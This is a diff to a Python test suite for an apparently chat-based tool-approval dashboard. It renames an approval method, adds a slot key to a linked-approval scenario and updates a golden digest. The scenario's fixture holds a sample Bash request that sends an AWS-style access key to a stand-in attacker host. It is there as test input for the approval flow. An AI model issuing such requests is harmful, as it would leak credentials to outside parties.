@@ -426,8 +426,13 @@ class _Dashboard:
         self._log.add("dashboard.get_linked_slot", thread_ts=thread_ts)
         return self._linked
 
-    def resolve_approval(self, request_id, approved):
-        self._log.add("dashboard.resolve_approval", request_id=request_id, approved=approved)
+    def resolve_slot_approval(self, slot, request_id, approved, *, expected_future=None):
+        self._log.add(
+            "dashboard.resolve_slot_approval",
+            slot=slot.key,
+            request_id=request_id,
+            approved=approved,
+        )
         return True
 
     def push_slots_update(self):
@@ -454,6 +459,7 @@ async def _scenario_linked_approval(log):
             "dashboard:chat-1",
             "Bash https://evil.example.invalid/?k=AKIAIOSFODNN7EXAMPLE",
             "echo hi",
+            slot_key="chat-1",
         )
         log.add("linked.posted", ts=ts, registry=sorted(handler._linked_approvals))
         result = await handler.handle_interaction(
@@ -1017,7 +1023,7 @@ _GOLDEN_DIGESTS: dict[str, str] = {
     "interactive_timeout": "e2a9e8c0d6398cbe68f81f17eb94ade5c20921c6221d4100f521ac5736448e30",
     "interactive_trust_in_dm": "8b16590ebe23568228ed607a24202a50b8edc4e80aef76e5774c7bef013e5ad5",
     "keyword_commands": "2acbad12808587a76ab0d64101da6d512b3ba8f0bc1f28ed2dab246d7a88b386",
-    "linked_approval": "8a85aaf602b5281707519634a49589c814694ac0f9c7b71164bbdaa2cc474bc9",
+    "linked_approval": "fd9f6840aa0486ea1af5d8380a8c28c5803407faed28e6271913603adb0d5fd4",
     "linked_dashboard_session": "2c49bd5afefcf913c1ab6a60bdeed6a7a3c21e826e5ffa985f0abe3e6959c0f9",
     "linked_thread_routes_to_slot": "0a481316843499aaa985a421a16e4c2510f5a1ff7b1a9a56e9f6cf4a37832e6e",
     "mention_prefixed_bang": "48e18741859e097ccf60e7d04b6c70546baa391b3451b065b997348a4a5d7734",
